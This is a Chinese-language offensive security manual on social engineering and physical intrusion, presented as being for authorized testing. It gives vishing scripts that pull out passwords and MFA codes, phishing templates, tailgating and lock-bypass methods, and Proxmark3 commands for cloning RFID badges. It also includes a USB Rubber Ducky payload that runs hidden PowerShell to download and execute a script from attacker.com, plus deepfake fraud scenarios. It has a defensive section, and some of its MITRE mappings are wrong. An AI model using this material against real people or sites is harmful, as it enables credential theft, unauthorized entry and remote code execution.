---
name: social-engineering
description: >
  Complete manual for social engineering and physical security assessments. Covers SE penetration testing methodology (phishing/vishing/SMiShing/impersonation), pretext call scripting and execution, physical intrusion assessment (tailgating, lock bypass, RFID cloning, camera evasion), and comprehensive reporting. Full attack execution and defense (awareness training, physical hardening, incident reporting).
domain: cybersecurity
subdomain: offensive-security
tags: [social-engineering, physical-security, vishing, pretexting, tailgating, rfid-cloning, lock-bypass, awareness-training, impersonation]
version: 2.0.0
---

# 社会工程学与物理安全评估 — 完整攻防手册

## 适用场景

- 授权的社会工程渗透测试（钓鱼、语音钓鱼、短信钓鱼、假冒身份）
- 物理安全评估（尾随、锁具绕过、RFID 克隆、摄像头规避）
- 安防意识培训项目设计与效果验证
- 合规审计中的物理安全检查（PCI-DSS 9.x、ISO 27001 A.11）
- 红队行动中的社会工程向量评估
- 安全事件后的物理/人员漏洞复盘

---

## Part A：攻击方法论

### 1. 识别与探测

#### 1.1 目标人员 OSINT

```bash
# LinkedIn 员工枚举 — 识别关键角色
# 工具: theHarvester, SpiderFoot, LinkedIn Google Dork
theharvester -d target.com -b linkedin,twitter,google -l 200

# Google Dork — 发现员工信息
site:linkedin.com/in "target company" "help desk" OR "IT support" OR "receptionist"
site:linkedin.com/in "target company" "facility manager" OR "security"

# 从公开来源获取的情报分类
echo "=== 员工角色优先级 ==="
echo "Tier 1 (直接入口): 前台接待、保安、IT支持、helpdesk"
echo "Tier 2 (内部访问): HR、行政、保洁、外包人员"
echo "Tier 3 (高价值目标): 管理层、财务、IT管理员"
```

#### 1.2 物理设施侦察

```bash
# 物理安全现场勘察清单
cat << 'EOF'
== 物理安全侦察检查项 ==

[ ] 建筑入口数量与类型（正门、侧门、后门、装卸区）
[ ] 访客管理流程（登记、陪同、临时证件）
[ ] 安保人员位置与巡逻规律
[ ] CCTV 摄像头位置、类型与盲区
[ ] 门禁系统类型（RFID、生物识别、密码、旋转闸）
[ ] 停车场与车辆进出控制
[ ] 吸烟区/休息区（社交渗透热点）
[ ] 快递/外卖交付流程
[ ] 无线网络信号泄漏范围
[ ] Dumpster diving 可能性（文件销毁流程）
[ ] 应急出口设计与警报状态
EOF

# 使用 Google Earth / 地图工具进行远程侦察
# - 建筑布局、入口、停车场位置
# - 周边环境（公共交通站点、咖啡馆）
# - 安保设施可见部分
```

#### 1.3 社交媒体情报

```bash
# 员工社交媒体分析 — 收集可利用信息
# 关注: 办公环境照片、工牌照片、内部布局、日程规律
# 工具: Maltego, SpiderFoot

# 常见信息泄露点
echo "=== 社交媒体信息泄露 ==="
echo "- 工牌照片 (可用于克隆/仿制)"
echo "- 办公桌照片 (便利贴密码、屏幕信息)"
echo "- 签到/位置信息 (出差、会议日程)"
echo "- 组织架构关系 (汇报线、同事关系)"
echo "- 技术栈泄露 (屏幕截图中的系统界面)"
```

### 2. 利用与攻击

#### 2.1 预设场景电话脚本 (Pretext Call / Vishing)

**场景 1: IT Helpdesk 假冒**

```python
#!/usr/bin/env python3
"""
Vishing Script: IT Helpdesk Password Reset
授权测试使用 — 预设角色为 IT 支持人员
"""
import datetime

CALL_LOG = {
    "target_org": "TARGET_CORP",
    "operator": "PENTESTER_ID",
    "date": datetime.datetime.now().isoformat(),
    "authorization_ref": "ENGAGEMENT-REF-001"
}

# === 开场白 ===
OPENING = """
您好，我是 IT 部门的 [假名]，技术支持组。
我们正在处理一个影响部分用户的系统问题，
您的账户被标记为可能受影响，
需要确认几个信息来验证您的身份并修复问题。

请问您现在是方便通话吗？
"""

# === 身份建立 (Authority Credibility) ===
CREDIBILITY = """
如果您需要确认我的身份，
可以拨打 IT 服务台总机 [提供的真实或伪造的分机号]，
我的工号是 [伪造工号]。
不过因为这个问题比较紧急，
建议我们现在就处理，大约只需要 2 分钟。
"""

# === 信息收集脚本 ===
STEPS = [
    {
        "step": 1,
        "purpose": "确认用户名",
        "script": "为了定位您的账户，请问您的域账号用户名是什么？",
        "fallback": "就是您登录电脑时用的那个用户名，通常格式是名.姓"
    },
    {
        "step": 2,
        "purpose": "获取当前密码或密码提示",
        "script": "系统需要验证当前密码才能重置，请告诉我您当前的密码？",
        "fallback": "我理解您的顾虑。这样吧，您只需要告诉我密码的前两个字符，我就能在系统中确认是您的账户。"
    },
    {
        "step": 3,
        "purpose": "获取 VPN/MFA 信息",
        "script": "我们还需要同步您的 VPN 设置。您使用的是哪种验证方式？短信还是认证器应用？",
        "fallback": "好的，那请您注意，稍后可能会收到一个验证码，那个是我这边触发的系统测试，您不需要操作。"
    },
    {
        "step": 4,
        "purpose": "确认额外信息",
        "script": "最后一个确认，您使用的电脑是台式机还是笔记本？型号是什么？这样我可以更新资产记录。",
    }
]

# === 收尾 ===
CLOSING = """
好的，您的问题已经处理完毕。
大约 5 分钟后您可能需要重新登录一次。
如果还有任何问题，请拨打 IT 服务台电话。
感谢您的配合，祝您工作顺利！
"""

def print_script():
    print("=== VISHING SCRIPT: IT HELPDESK ===")
    print(f"Authorization: {CALL_LOG['authorization_ref']}")
    print(f"\n[OPENING]\n{OPENING}")
    for step in STEPS:
        print(f"\n[Step {step['step']}: {step['purpose']}]")
        print(f"  主话术: {step['script']}")
        if 'fallback' in step:
            print(f"  备用话术: {step['fallback']}")
    print(f"\n[CLOSING]\n{CLOSING}")

if __name__ == "__main__":
    print_script()
```

**场景 2: 供应商/承包商假冒**

```
=== PRETEXT: 供应商送货 ===

角色: 某IT设备供应商送货员
道具: 假工牌、公司Logo文件夹、设备箱

[前台/保安]
"您好，我是 [供应商名] 的，来送 [IT部门-联系人说名字] 订购的设备。
  他/她今天应该在办公室吧？之前约好的。"

[如果被要求登记]
"好的没问题，麻烦帮我登记一下。车停在卸货区，
  设备比较重，能不能让我先把东西搬进来再登记？"

[如果被要求联系确认人]
"好的，不过我手机快没电了，能借用一下座机吗？
  或者您能帮我联系一下 [IT联系人名]？"

关键心理触发点:
- 紧迫感 (送货时间限制)
- 权威性 (供应商关系)
- 互惠 (搬重物需要帮助)
- 社会认同 (某某订购的)
```

**场景 3: 紧急维修人员**

```
=== PRETEXT: 紧急维修 ===

角色: 消防/电气/空调维修人员
道具: 工具箱、安全背心、工作单

[保安/前台]
"紧急维修，[物业名] 派过来的。
  你们 [楼层/区域] 的 [消防系统/配电箱/空调] 报了故障，
  需要立即检查，安全隐患。"

关键要素:
- "紧急" 降低验证严格度
- 安全相关触发紧迫感
- 制服/工装增加可信度
- 携带工具箱强化身份
- 提供可回拨但受控的联系电话
```

#### 2.2 钓鱼邮件模板

```python
# SET (Social Engineering Toolkit) 钓鱼攻击配置
# 文件: set_config钓鱼配置

# === 钓鱼邮件关键要素 ===
EMAIL_CHECKLIST = {
    "sender_spoofing": "使用相似域名 (如 target-corp.com vs target.com)",
    "urgency_trigger": "账户锁定通知 / 密码过期 / 安全警告",
    "authority_source": "IT部门 / HR / 管理层",
    "call_to_action": "点击链接'验证账户' / 下载'紧急文档'",
    "landing_page": "克隆目标登录页面",
    "tracking": "嵌入追踪像素追踪打开率"
}

# 使用 GoPhish 进行钓鱼模拟
# docker run -d -p 3333:3333 gophish/gophish
# 邮件模板示例 (HTML)
PHISH_TEMPLATE = """
Subject: [紧急] IT 安全通知 - 您的账户需要立即验证

From: IT Security <it-security@target-c0rp.com>

尊敬的员工:

我们的安全系统检测到您的账户存在异常登录尝试。
为了保护您的数据安全，请在 24 小时内验证您的身份。

[验证我的账户]  <!-- 恶意链接 -->

如果您未能在规定时间内完成验证，您的账户将被临时锁定。

IT 安全团队
"""
```

#### 2.3 物理入侵技术

**尾随 (Tailgating)**

```
=== 尾随技术分类 ===

1. 纯尾随 (Pure Tailgating)
   - 在授权人员开门时紧跟进入
   - 不携带任何道具，依赖社交压力
   - 最佳时机: 上下班高峰、午休时间
   - 话术: "谢谢帮我扶一下门" / 点头微笑

2. 道具辅助尾随 (Prop-Assisted)
   - 双手捧重物 (箱子、咖啡)
   - 假装接电话无法刷卡
   - 话术: "不好意思东西太多，能帮我刷一下卡吗？"
   - 雨天: 假装雨伞挡住手

3. 假冒送货尾随
   - 携带快递包裹
   - 假装是外卖/快递配送
   - 利用前台到内部区域的过渡区

4. 技术辅助
   - 远距离RFID读取获取卡片信息
   - 使用克隆卡直接刷卡
   - 使用通用RFID模拟器
```

**锁具绕过方法**

```
=== 常见门锁绕过技术 ===

1. 标准钥匙锁
   - 撬锁 (Lock Picking): 使用张力扳手 + 拨针
   - 凹凸钥匙 (Bump Key): 快速敲击技术
   - 时间: 熟练者 10-60 秒

2. RFID/NFC 门禁
   - 克隆攻击 (见 2.4)
   - 重放攻击: 捕获并重放有效卡信号
   - 降级攻击: 强制使用低安全性协议

3. 磁卡 (Swipe Card)
   - 磁条复制: 读取并写入空白卡
   - Wiegand 协议嗅探

4. 生物识别
   - 指纹: 复制指纹模具
   - 面部识别: 照片/视频/3D面具
   - 虹膜: 高分辨率照片 + 隐形眼镜

5. 电子门锁
   - 默认密码尝试
   - 电磁干扰攻击
   - 内部紧急释放按钮

6. 应急门
   - 测试报警器是否启用
   - 延迟报警设置利用
   - 非高峰时段测试
```

#### 2.4 RFID 卡片克隆

```bash
# === Proxmark3 操作手册 ===

# 1. 连接设备
pm3 → hw connect

# 2. 自动检测卡片类型
pm3 → hf search
# 或低频卡
pm3 → lf search

# === HID iCLASS (常见企业门禁卡) ===

# 读取 iCLASS 卡片
pm3 → hf iclass info
pm3 → hf iclass dump --ki 0 --fn target_iclass

# 模拟 iCLASS 卡片
pm3 → hf iclass simulate --ki 0

# === Mifare Classic (常见门禁/支付) ===

# 探测卡片
pm3 → hf mf info

# 获取已知密钥
pm3 → hf mf chk --1k -f /path/to/default_keys.dic

# 转储卡片数据
pm3 → hf mf dump --1k -k <key_found>

# 写入空白卡
pm3 → hf mf restore --1k -u <uid> -f dump_file

# === EM4100 / HID Prox (低频125kHz) ===

# 读取低频卡
pm3 → lf hid read
pm3 → lf em 410x read

# 克隆到 T5577 可写卡
pm3 → lf em 410x clone --id <read_id>
pm3 → lf hid clone --id <read_id>

# === 远距离读取 (便携设备) ===
# 使用 Raspberry Pi + RFID 模块
# 或专用便携式 RFID 读取器
# 有效距离: 通常 5-15cm, 定向天线可达 50cm+
```

#### 2.5 USB 投放攻击

```bash
# === USB Rubber Ducky / BadUSB ===

# Ducky Script 示例: 自动执行系统信息收集
cat << 'EOF' > payload.txt
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
EOF

# 使用 Hak5 USB Rubber Ducky 编码
# java -jar encoder.jar -i payload.txt -o inject.bin

# === 安全防护绕过 ===
# 如果目标有 USB 端口限制:
# 1. 使用 HID 模式 (键盘模拟) 而非存储模式
# 2. 使用 USB-C / Lightning 适配器增加兼容性
# 3. 标记为 "奖金名册" / "薪资调整" 等诱饵标签
```

### 3. 工具使用

```bash
# === 社会工程工具箱 ===

# SET (Social Engineering Toolkit) — 钓鱼与 payload
sudo apt install setoolkit
setoolkit
# 1) Social-Engineering Attacks
#   1) Spear-Phishing Attack Vectors
#   2) Website Attack Vectors
#   3) Credential Harvester Attack
#   4) Mass Mailer Attack

# GoPhish — 钓鱼模拟平台
docker run -d --name gophish -p 3333:3333 gophish/gophish
# 访问 https://localhost:3333
# 1. 创建发送配置 (SMTP)
# 2. 创建邮件模板
# 3. 创建着陆页 (克隆目标登录页)
# 4. 导入目标列表
# 5. 启动活动

# Proxmark3 — RFID/NFC 分析
# 见 2.4 节详细命令

# Kingfisher / Flipper Zero — 便携式 RF 工具
# Flipper Zero 常用命令:
# Sub-GHz: 读取/复制无线门禁信号
# RFID: 读取/模拟低频卡
# NFC: 读取/模拟高频卡
# Infrared: 模拟遥控器 (车库门等)

# 物理工具清单
cat << 'EOF'
== 物理安全测试工具包 ==

RFID/NFC:
  [ ] Proxmark3 RDV4 或 Flipper Zero
  [ ] T5577 可写低频卡 x10
  [ ] Mifare Classic 空白卡 x10
  [ ] UID 可写 CUID/FUID 卡

锁具:
  [ ] 锁匠工具套装 (tension wrench + pick set)
  [ ] Bump key 套装 (常用型号)
  [ ] 旁路工具 (bypass tools)

伪装/道具:
  [ ] 可打印假工牌 + 卡套
  [ ] 安全背心/制服
  [ ] 剪贴板/文件夹
  [ ] 工具箱
  [ ] 快递包裹/设备箱

记录:
  [ ] 隐蔽摄像头 (记录测试过程)
  [ ] 录音设备 (vishing 记录)
  [ ] 测试授权书打印件
EOF
```

### 4. 绕过技术

```
=== 安保人员规避策略 ===

1. 时间选择
   - 上下班高峰: 人多，验证松懈
   - 午休时段: 替换岗，注意力分散
   - 深夜: 人员少但警惕性可能更高
   - 周末/假日: 可能只有少量安保

2. 心理操控
   - 自信且从容的态度是最有效的工具
   - 目标是让安保人员不想"为难"你
   - 使用对方的名字建立亲和力
   - 提前了解内部术语和缩写

3. 摄像头盲区
   - 识别摄像头固定角度 vs PTZ
   - 利用入口遮挡物
   - 注意: 测试目的是发现盲区，而非实际隐藏
   - 记录所有盲区位置用于报告

4. 门禁系统弱点
   - 防尾随门 (mantrap) 的间隔时间设置
   - 感应门 vs 手动门的安全差异
   - 紧急出口的报警状态检查
   - 访客卡与员工卡的权限差异
```

---

## Part B：检测与防御

### 5. 检测规则

#### 5.1 物理入侵检测

```yaml
# SIEM 规则: 物理安全异常检测
# 适用于 Splunk / Elastic SIEM

rule_name: "physical_access_anomaly"
description: "检测异常物理访问模式"
conditions:
  - type: "badge_access"
    alert: "同一工牌在短时间内出现在不同位置"
    query: >
      | from badge_access_log
      | where time_delta < 5min AND location_distance > 500m
      | stats count by badge_id, employee_name

  - type: "after_hours_access"
    alert: "非工作时间访问敏感区域"
    query: >
      | from badge_access_log
      | where hour NOT IN (8,9,10,11,12,13,14,15,16,17,18)
      | AND zone = "sensitive_area"
      | lookup employee_schedule

  - type: "tailgating_indicator"
    alert: "门开启但只有一次刷卡记录（可能有尾随）"
    query: >
      | from door_sensor_log
      | join badge_access_log on door_id, timestamp
      | where entry_count > badge_swipe_count

  - type: "badge_anomaly"
    alert: "工牌异常使用模式"
    patterns:
      - "从未刷卡过的人突然刷卡"
      - "同一工牌同时出现在两个门"
      - "离职人员工牌仍有效"
      - "访客卡访问受限区域"
```

#### 5.2 访客管理异常

```python
# 访客管理系统异常检测脚本
import datetime
from collections import defaultdict

def detect_visitor_anomalies(visitor_logs):
    anomalies = []

    for visit in visitor_logs:
        # 未签出的访客
        if visit.check_in and not visit.check_out:
            hours = (datetime.datetime.now() - visit.check_in).total_seconds() / 3600
            if hours > 8:
                anomalies.append({
                    "type": "visitor_overstay",
                    "visitor": visit.name,
                    "duration_hours": hours,
                    "severity": "MEDIUM"
                })

        # 访客访问受限区域
        if visit.accessed_zones:
            restricted = set(visit.accessed_zones) & RESTRICTED_ZONES
            if restricted:
                anomalies.append({
                    "type": "visitor_restricted_access",
                    "visitor": visit.name,
                    "zones": list(restricted),
                    "severity": "HIGH"
                })

        # 频繁来访
        visit_count = count_visits(visitor_logs, visit.name, days=30)
        if visit_count > 5:
            anomalies.append({
                "type": "frequent_visitor",
                "visitor": visit.name,
                "count_30d": visit_count,
                "severity": "LOW"
            })

    return anomalies
```

#### 5.3 钓鱼检测指标

```yaml
# 邮件安全网关检测规则
phishing_detection_rules:
  sender_analysis:
    - "发件人域名与目标域名相似度 > 85%"
    - "发件人域名注册时间 < 30天"
    - "SPF/DKIM/DMARC 验证失败"
    - "Reply-To 地址与 From 地址不同域"

  content_analysis:
    - "包含紧迫性关键词: '紧急' '立即' '24小时' '账户锁定'"
    - "要求提供密码或凭证"
    - "链接域名与显示文本不同"
    - "IP地址作为链接目标"

  behavioral_indicators:
    - "同一邮件发送给多个收件人 (BCC)"
    - "非工作时间发送"
    - "包含附件且附件类型为可执行文件"
```

### 6. 修复方案

#### 6.1 物理安全加固清单

```
=== 物理安全加固检查清单 ===

[LEVEL 1: 基础措施]
[ ] 所有入口配备门禁系统
[ ] 访客管理制度 (登记、陪同、临时证件)
[ ] CCTV 覆盖所有入口和敏感区域
[ ] 安全照明覆盖周边
[ ] 员工安全意识培训 (每年至少一次)

[LEVEL 2: 增强措施]
[ ] 防尾随系统 (mantrap / 旋转闸)
[ ] 双因素门禁 (卡+PIN / 卡+生物识别)
[ ] 安保人员 24/7 值守
[ ] 访客管理系统 (自动过期、区域限制)
[ ] 物理安全审计 (每季度)
[ ] 离职人员工牌当日注销流程

[LEVEL 3: 高级措施]
[ ] 安全程控 (Security Operations Center)
[ ] 实时视频分析 (AI 异常行为检测)
[ ] RFID 防克隆技术 (加密卡、动态ID)
[ ] 生物识别门禁 (指纹+面部双因素)
[ ] 物理入侵检测系统 (PIDS)
[ ] 安全区域分级管理 (分区、分级权限)

[LEVEL 4: 数据中心级别]
[ ] 生物识别 + 安保验证双重认证
[ ] 无窗户、防窥设计
[ ] 电磁屏蔽
[ ] 7x24 安保 + 监控
[ ] 访问日志保留 >= 90天
```

#### 6.2 安防意识培训项目设计

```python
# 社会工程防御培训项目框架
TRAINING_PROGRAM = {
    "module_1_awareness": {
        "title": "社会工程基础认知",
        "duration": "30分钟",
        "content": [
            "什么是社会工程攻击",
            "常见攻击类型 (钓鱼、语音钓鱼、尾随、假冒)",
            "真实案例分享",
            "攻击者的心理操控技巧"
        ],
        "assessment": "在线测验 (10题, 及格线80%)"
    },
    "module_2_recognition": {
        "title": "攻击识别训练",
        "duration": "45分钟",
        "content": [
            "识别钓鱼邮件的 10 个关键特征",
            "可疑电话的应对方法",
            "陌生人尾随的应对策略",
            "USB设备安全风险"
        ],
        "assessment": "模拟钓鱼测试 (邮件+电话)"
    },
    "module_3_response": {
        "title": "正确响应流程",
        "duration": "30分钟",
        "content": [
            "发现可疑行为的报告流程",
            "不应做的事 (不要点击、不要提供信息)",
            "如何安全地验证来电者身份",
            "访客管理的员工责任"
        ],
        "assessment": "情景模拟演练"
    },
    "module_4_physical": {
        "title": "物理安全意识",
        "duration": "20分钟",
        "content": [
            "门禁使用规范 (禁止代刷、注意尾随)",
            "访客陪同要求",
            "敏感区域进出规则",
            "桌面清洁政策 (Clean Desk)"
        ],
        "assessment": "现场检查 + 签署确认"
    }
}

# 持续测试计划
ONGOING_TESTS = {
    "phishing": "每月随机钓鱼模拟 (覆盖率 100%)",
    "vishing": "每季度语音钓鱼测试 (针对高风险部门)",
    "physical": "每半年物理渗透测试",
    "usb_drop": "每年 USB 投放测试",
    "reporting": "月度报告: 点击率、报告率、趋势分析"
}

# 关键 KPI
KPIS = {
    "phishing_click_rate": "目标: < 5% (业界平均 15-20%)",
    "report_rate": "目标: > 80% (可疑邮件报告率)",
    "physical_breach_rate": "目标: 0 次成功尾随/入侵",
    "training_completion": "目标: 100% 员工完成年度培训",
    "incident_response_time": "目标: < 15分钟 (从发现到报告)"
}
```

#### 6.3 门禁系统升级建议

```
=== RFID 安全升级路径 ===

当前状态 → 目标状态
-----------------------------------------------------------
HID Prox (125kHz)     →  HID iCLASS SE / Seos (加密)
Mifare Classic        →  Mifare DESFire EV2/EV3
Wiegand 协议          →  OSDP (加密通信)
单一卡认证            →  卡 + PIN 双因素
静态卡号              →  动态ID / 滚动码
明文传输              →  AES-128/256 加密

=== 门禁系统加固建议 ===

1. 协议升级
   - 禁用 Wiegand 26-bit (易被嗅探)
   - 部署 OSDP v2 (RS-485 加密通信)
   - 使用 AES-128 加密读卡器通信

2. 卡片安全
   - 使用 MIFARE DESFire EV3 或 Seos
   - 启用卡片相互认证
   - 实施 AES 应用密钥
   - 定期轮换密钥

3. 系统管理
   - 实施最小权限原则
   - 离职人员当日注销
   - 访客卡自动过期 (4-8小时)
   - 定期审计访问日志
   - 异常访问实时告警

4. 物理防护
   - 读卡器安装防拆检测
   - 门禁控制器放置在受保护区域
   - 线缆管道物理防护
   - 备用电源保障
```

---

## 速查表

### SE 攻击向量决策树

```
目标评估
├─ 远程攻击
│  ├─ 有邮箱 → 钓鱼邮件 (Credential Harvesting / Malware)
│  ├─ 有电话 → 语音钓鱼 (Vishing)
│  └─ 有手机 → 短信钓鱼 (SMiShing)
├─ 近距离攻击
│  ├─ WiFi 范围 → Evil Twin / WiFi 钓鱼
│  ├─ 物理可达 → USB 投放
│  └─ RFID 范围 → 门禁卡克隆
└─ 物理入侵
   ├─ 有门禁 → 尾随 / 克隆卡 / 锁绕过
   ├─ 有安保 → 道具辅助假冒
   └─ 有摄像头 → 盲区分析 + 时间选择
```

### 物理安全评估检查清单

| 检查项 | 测试方法 | 通过标准 | 风险等级 |
|--------|---------|---------|---------|
| 外门锁定 | 物理测试 | 所有门正常锁定 | 高 |
| 尾随防护 | 模拟尾随 | 被阻止或报告 | 高 |
| 访客管理 | 模拟访客 | 必须登记+陪同 | 高 |
| RFID 克隆 | Proxmark3 | 克隆卡无法开门 | 中 |
| 摄像覆盖 | 盲区分析 | 无关键盲区 | 中 |
| 应急门 | 报警测试 | 开门即报警 | 高 |
| USB 端口 | 投放测试 | 端口被禁用/监控 | 中 |
| 前台验证 | 假冒测试 | 要求有效证件 | 高 |
| 离职注销 | 流程审计 | 当日注销 | 高 |
| 深夜访问 | 时段测试 | 需额外审批 | 中 |

### 预设场景模板

| 场景 | 目标 | 难度 | 成功率 |
|------|------|------|--------|
| IT Helpdesk 假冒 | 获取凭证 | ★★☆ | 60-70% |
| 供应商送货 | 物理进入 | ★★☆ | 50-60% |
| 紧急维修人员 | 物理进入 | ★★★ | 40-50% |
| 新员工假冒 | 物理进入 | ★☆☆ | 60-70% |
| 外部审计员 | 获取信息 | ★★★ | 30-40% |
| 快递配送 | 前台绕过 | ★☆☆ | 70-80% |

### Proxmark3 命令速查

```
# 连接与检测
hw connect                    # 连接设备
hf search                     # 搜索高频卡
lf search                     # 搜索低频卡

# Mifare Classic
hf mf info                    # 卡片信息
hf mf chk --1k               # 破解密钥
hf mf dump --1k -k <key>     # 转储数据
hf mf restore --1k           # 恢复到新卡

# HID iCLASS
hf iclass info                # 卡片信息
hf iclass dump --ki 0         # 转储数据

# 低频 EM4100/HID
lf em 410x read              # 读取 EM4100
lf em 410x clone --id <id>   # 克隆到 T5577
lf hid read                   # 读取 HID Prox
lf hid clone --id <id>        # 克隆 HID

# 模拟
hf mf sim --uid <uid>         # 模拟 Mifare
lf em 410x sim --id <id>      # 模拟 EM4100
```

---

## MITRE ATT&CK 映射

| 战术 | 技术 | 子技术 | 本手册覆盖 |
|------|------|--------|-----------|
| Initial Access | T1566 | Phishing | 2.2 钓鱼邮件 |
| Initial Access | T1598 | Phishing for Info | 2.1 Vishing |
| Execution | T1204 | User Execution | 2.5 USB 投放 |
| Credential Access | T1189 | Drive-by Compromise | 2.2 钓鱼 |
| Credential Access | T1200 | Hardware Additions | 2.4 RFID 克隆 |
| Discovery | T1082 | System Info Discovery | 2.5 USB payload |
| Physical Access | T1192 | Supply Chain Compromise | 2.3 物理入侵 |
| Defense Evasion | T1036 | Masquerading | 2.1 预设场景 |
| Collection | T1114 | Email Collection | 2.2 钓鱼页面 |

---

## 前置条件

```
授权与合规:
  [ ] 签署的渗透测试授权书 (Scope明确包含SE和物理测试)
  [ ] 客户指定的紧急联系人
  [ ] 测试时间窗口确认
  [ ] 法律免责条款确认
  [ ] 保险覆盖确认

技术准备:
  [ ] Proxmark3 / Flipper Zero 设备
  [ ] 锁匠工具套装 (当地法律合规)
  [ ] GoPhish 平台部署
  [ ] 钓鱼域名注册
  [ ] 隐蔽摄像设备
  [ ] 录音设备 (vishing)

文档准备:
  [ ] 测试计划文档
  [ ] 预设场景剧本
  [ ] 紧急中止流程
  [ ] 报告模板
```

---

## Part C：2025-2026 最新趋势与技术补充

### C.1 AI/深度伪造语音驱动的社会工程攻击

#### C.1.1 2025-2026 威胁态势统计

```
=== AI 语音钓鱼 (Vishing) 关键统计 ===

来源: CrowdStrike / APWG / Group-IB / FBI IC3 / deepstrike.io

[2025 核心数据]
- Vishing 攻击同比增长: 442% (H1→H2 2024, CrowdStrike)
- 深度伪造语音攻击增长: 170% (Q2 2025 vs Q1 2025)
- 预计全球深度伪造诈骗损失: $40B by 2027 (Group-IB)
- 2025 Q1 深度伪造诈骗损失超: $200M (Right-Hand AI / Americas)
- 1/4 美国人收到过深度伪造语音电话 (Hiya 2025)
- 人类语音克隆检测准确率仅: 73% (留下27%盲区)
- 10%+ 银行报告深度伪造语音钓鱼损失 > $1M (平均$600K/事件)
- 59.4M 美国人曾是语音钓鱼受害者 (Keepnet Labs)
- FBI IC3 技术支持诈骗: 37,560起 (2023), $924.5M 损失 (+15%)

[全球热点]
- 巴西: 2024 诈骗损失 $54B, 94% 国民月均遭遇诈骗
- 韩国: 2025 语音钓鱼损失预计超 ₩1万亿 ($718M)
- 日本: 电信诈骗损失 ¥44.1B ($295M, +19%)

[攻击演进]
- TOAD (Telephone-Oriented Attack Delivery): 6.1% 钓鱼活动使用混合攻击
- 2025 深度伪造语音克隆仅需 3 秒音频样本
- 实时语音转换: 攻击者可实时将声音转换为目标人物
- 多语言语音克隆: 攻击者可克隆任意语言
```

#### C.1.2 深度伪造语音克隆攻击技术

```python
#!/usr/bin/env python3
"""
AI 语音克隆社会工程攻击检测框架
用于识别和防御基于深度伪造语音的攻击
"""

# === 攻击者工具链 (红队视角) ===
ATTACKER_TOOLCHAIN = {
    "voice_cloning": {
        "commercial_tools": [
            "ElevenLabs (商用, 最真实)",
            "Resemble AI (实时语音转换)",
            "PlayHT (多语言克隆)",
            "Descript (Overdub 功能)",
        ],
        "open_source": [
            "Bark (suno-ai, 开源 TTS)",
            "Tortoise-TTS (高质量, 开源)",
            "OpenVoice (MyShell, 实时克隆)",
            "So-VITS-SVC (社区语音转换)",
            "RVC (Retrieval-based Voice Conversion)",
        ],
        "required_samples": "3-30秒目标音频即可克隆",
    },
    "video_deepfake": {
        "tools": [
            "DeepFaceLab (开源, 高质量)",
            "FaceSwap (开源)",
            "HeyGen (商用, 实时换脸)",
            "Synthesia (商用, AI视频生成)",
        ],
    },
    "real_time_tools": {
        "voice_changer": "实时变声软件 (Voicemod/clownfish)",
        "deepfake_live": "实时视频换脸 (Zoom/Teams)",
    },
}

# === 红队深度伪造语音钓鱼场景 ===
DEEPFAKE_VISHING_SCENARIOS = {
    "CEO_fraud": {
        "target": "CFO/财务团队",
        "technique": "克隆CEO声音要求紧急转账",
        "real_case": "2025年香港$2500万案例 - 深度伪造视频会议",
        "success_rate": "30-50% (未经训练)",
        "countermeasure": "建立双因素验证转账流程 (语音+独立渠道确认)"
    },
    "IT_helpdesk": {
        "target": "普通员工",
        "technique": "克隆IT经理声音要求密码重置",
        "real_case": "CrowdStrike 2025报告: AI语音钓鱼攻击激增442%",
        "success_rate": "60-70%",
        "countermeasure": "验证码必须通过官方系统发送, 不通过电话传递"
    },
    "family_emergency": {
        "target": "个人/高管家属",
        "technique": "克隆家人声音声称紧急情况需要资金",
        "real_case": "2024-2025 多国报告大规模家庭紧急诈骗",
        "success_rate": "40-60%",
        "countermeasure": "建立家庭安全暗号/确认机制"
    },
    "vendor_impersonation": {
        "target": "采购/财务",
        "technique": "克隆供应商声音修改银行账户信息",
        "success_rate": "20-40%",
        "countermeasure": "银行账户变更需双渠道书面确认"
    }
}

# === 检测脚本: 语音深度伪造指示器 ===
DEEPFAKE_VOICE_INDICATORS = {
    "technical": [
        "不自然的呼吸模式 (过于规律或缺失)",
        "频率异常 (人声200-8000Hz, 克隆可能缺失高频)",
        "微妙的音调跳变 (AI生成的声调过渡不自然)",
        "环境噪声不一致 (背景音与声称场景不匹配)",
        "延迟异常 (实时克隆可能引入额外延迟 >200ms)",
    ],
    "behavioral": [
        "回避特定确认问题 ('你能告诉我你的员工编号吗?')",
        "过度强调紧迫性 ('必须在10分钟内完成')",
        "拒绝通过其他渠道确认 ('我现在只有电话能联系')",
        "请求绕过正常流程 ('系统故障, 走手动流程')",
        "通话中有多人声线切换 (多人克隆切换)",
    ],
    "contextual": [
        "非工作时间/非预期来电",
        "不寻常的请求 (大额转账、凭证重置、VPN连接)",
        "来自非标准号码的内部来电",
        "通话内容与已知业务流程不符",
    ]
}
```

#### C.1.3 深度伪造视频会议攻击 (Deepfake Video Conference)

```
=== 实时深度伪造视频会议攻击 ===

2025年香港案例: 攻击者使用深度伪造视频会议
克隆多名C级高管, 说服财务人员转账$2500万

攻击流程:
1. 侦察: 通过社交媒体获取高管照片/视频/声音样本
2. 准备: 使用DeepFaceLab/HeyGen生成实时换脸
3. 语音: 克隆各参会者声音 (ElevenLabs/Resemble AI)
4. 平台: 创建伪造的Zoom/Teams会议链接
5. 执行: 召开"紧急财务会议", 多名"高管"同时在线
6. 请求: 要求紧急转账至指定账户

红队模拟要点:
- 需要目标高管的充足音视频素材 (>=30秒视频+音频)
- 使用实时换脸工具 (DeepFaceLive)
- 确保光线、角度、背景与目标人物常见场景匹配
- 准备好应对"你的摄像头画面有点卡"等质疑
- 测试组织的视频会议身份验证流程

防御措施:
- 高级别会议需要多因素身份验证
- 关键决策不在单一视频会议中做出
- 建立"挑战短语"机制 (预先约定的暗号)
- AI检测工具集成到视频会议平台
- 大额转账需要线下+线上双渠道确认
```

### C.2 Proxmark3 2025 固件更新与 RFID 工具生态

#### C.2.1 Proxmark3 Iceman 固件 2025 更新

```bash
# === Proxmark3 Iceman Fork 2025 更新要点 ===
# 来源: RfidResearchGroup GitHub / Dangerous Things Forum

# 2025年6月重大固件更新
# 主要改进:
# 1. iCLASS 恢复速度大幅提升
# 2. MIFARE Classic/DESFire 新工具
# 3. ST25TB 系列支持新增
# 4. 模拟性能改善

# 编译最新固件
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
git pull
make clean && make all

# 刷入固件
# pm3-flash-all

# === 新增/增强功能 ===

